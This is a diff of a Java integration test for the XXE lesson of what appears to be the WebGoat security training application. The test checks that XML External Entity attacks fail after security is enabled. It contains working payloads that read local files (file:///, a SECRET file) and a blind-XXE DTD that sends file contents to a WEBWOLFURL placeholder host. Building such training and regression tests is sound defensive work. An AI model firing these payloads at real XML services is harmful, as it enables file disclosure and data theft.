@@ -12,10 +12,14 @@ import io.restassured.http.ContentType;
 
 public class XXETest extends IntegrationTest {
 
-    private static final String xxe3 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
-    private static final String xxe4 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
-    private static final String dtd7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"file:SECRET\"><!ENTITY % all \"<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>\">%all;";
-    private static final String xxe7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM \"WEBWOLFURL/USERNAME/blind.dtd\">%remote;]><comment><text>test&send;</text></comment>";
+    private static final String xxe3 = """
+            <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>""";
+    private static final String xxe4 = """
+            <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE user [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;test</text></comment>""";
+    private static final String dtd7 = """
+            <?xml version="1.0" encoding="UTF-8"?><!ENTITY % file SYSTEM "file:SECRET"><!ENTITY % all "<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>">%all;""";
+    private static final String xxe7 = """
+            <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM "WEBWOLFURL/USERNAME/blind.dtd">%remote;]><comment><text>test&send;</text></comment>""";
 
     private String webGoatHomeDirectory;
     private String webwolfFileDir;
@@ -39,8 +43,13 @@ public class XXETest extends IntegrationTest {
         startLesson("XXE");
         webGoatHomeDirectory = getWebGoatServerPath();
         webwolfFileDir = getWebWolfServerPath();
-        RestAssured.given().when().relaxedHTTPSValidation()
-		.cookie("JSESSIONID", getWebGoatCookie()).get(url("/xxe/applysecurity"));
+        RestAssured.given()
+                .when()
+                .relaxedHTTPSValidation()
+                .cookie("JSESSIONID", getWebGoatCookie())
+                .get(url("service/enable-security.mvc"))
+                .then()
+                .statusCode(200);
         checkAssignment(url("/WebGoat/xxe/simple"), ContentType.XML, xxe3, false);
         checkAssignment(url("/WebGoat/xxe/content-type"), ContentType.XML, xxe4, false);
         checkAssignment(url("/WebGoat/xxe/blind"), ContentType.XML, "<comment><text>" + getSecret() + "</text></comment>", false);
